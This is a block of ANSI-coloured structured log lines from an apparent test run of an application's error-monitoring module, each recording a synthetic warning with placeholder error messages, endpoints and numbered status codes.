WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916949Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4258'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.916998Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4259'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917047Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4260'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917096Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4261'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917144Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4262'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917193Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4263'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917241Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4264'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917290Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4265'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917338Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4266'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917386Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4267'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917433Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4268'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917482Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4269'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917529Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4270'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917576Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4271'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917625Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4272'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917675Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4273'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917729Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4274'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917781Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4275'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917830Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4276'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917887Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4277'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917939Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4278'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.917989Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4279'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918038Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4280'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918087Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4281'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918136Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4282'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918187Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4283'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918297Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4284'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918370Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4285'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918473Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4286'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918539Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4287'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918594Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4288'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918651Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4289'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918702Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4290'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918752Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4291'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918802Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4292'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918853Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4293'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918903Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4294'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.918955Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4295'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919004Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4296'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.919054Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m86[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4297'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
